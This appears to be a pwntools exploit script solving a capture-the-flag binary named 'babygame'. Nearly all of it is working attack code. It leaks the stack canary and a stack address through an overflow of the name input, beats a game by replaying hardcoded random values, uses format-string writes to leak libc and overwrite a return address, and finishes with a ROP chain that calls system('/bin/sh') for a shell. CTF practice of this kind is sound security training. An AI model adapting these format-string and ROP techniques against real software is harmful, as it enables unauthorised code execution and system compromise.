# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

context(arch='amd64')
#io = remote('', )
# libc = ELF('./libc-2.31.so')
io = process('babygame',env = {'LD_PRELOAD':'./libc-2.31.so'})
#io = remote('120.25.205.249',39260)
libc = ELF('./libc-2.31.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda a=False  : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x   : io.recvn(x)
sn = lambda x   : io.send(x)
sl = lambda x   : io.sendline(x)
sa = lambda a,b   : io.sendafter(a,b)
sla = lambda a,b  : io.sendlineafter(a,b)
irt = lambda   : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s   : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data  : u32(data.ljust(4, '\x00'))
uu64 = lambda data  : u64(data.ljust(8, '\x00'))
ur64 = lambda data  : u64(data.rjust(8, '\x00'))
def add(idx,size):
 sl('1')
 sla('Index?\n',str(idx))
 sla('Size?\n',str(size))
def show(idx):
 sl('2')
 sla('Index?\n',str(idx))
 
def edit(idx,content):
 sl('3')
 sla('Index?\n',str(idx))
 sa('content:\n',content)
  
def delete(idx):
 sl('4')
 sla('Index?\n',str(idx))

# dbg()
sa('your name:\n','a'*0x108+'a')
ru('a'*0x109)
canary = u64(rn(7).rjust(8,'\x00'))
stack = u64(rn(6).ljust(8,'\x00'))

# data = io.recvuntil("\x7f")[-13:].ljust(13,"\x00")
# canary = data[:14]
# libcbase = data[14:26]
# print libcbase
lg('stack')
lg('canary')
rand = [1,2,0,2,2,1,2,2,1,1,2,0,2,1,1,1,1,2,2,1,2,0,1,2,0,1,1,1,0,2,2,1,0,0,2,2,1,2,2,0,1,2,0,0,0,2,0,0,1,0,1,0,0,0,1,1,1,0,0,2,0,0,1,1,0,1,0,2,1,0,2,2,0,2,0,0,2,1,1,0,1,1,2,2,1,0,1,0,0,2,0,1,0,2,2,0,1,0,0,2]
input_m = []
for i in range(100):
 if rand[i] == 1:
  sla('round %s: \n'%str(i+1),'2')
 elif rand[i] == 2:
  sla('round %s: \n'%str(i+1),'0')
 elif rand[i] == 0:
  sla('round %s: \n'%str(i+1),'1')

pay = '%57c%8$hhn%9$p\n'.ljust(0x10,'a') + p64(stack - 0x218)

#raw_input()
#context.log_level = 'debug'
# dbg()
sn(pay)
# dbg()
ru('0x')
libc_base = int(rn(12),16) - 0x61d6f
pop_rdi = libc_base + libc.search(asm('pop rdi\nret')).next()
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
ret = libc_base + 0x0000000000022679
lg('libc_base')
lg('pop_rdi')
lg('system_addr')
lg('binsh_addr')

pay = '%57c%8$hhn%23$p'.ljust(0x10,'a') + p64(stack - 0x218)
sn(pay)
ru('0x')
main_addr = int(rn(12),16) + 0x2e9 + 0x5 +0x20
lg('main_addr')

raw_input()
pay = '%' + str(main_addr & 0xffff) + 'c%10$hn'.ljust(0x1a,'a') + p64(stack - 0x218)
sn(pay)

pay = 'a'*0x108 + p64(canary) + p64(0)*3 + p64(pop_rdi) + p64(binsh_addr) +p64(ret)+ p64(system_addr)
# raw_input()
# dbg()
sa('your name:\n',pay)
sla('round %s: \n'%str(1),'2')
sla('round %s: \n'%str(2),'1')


irt()
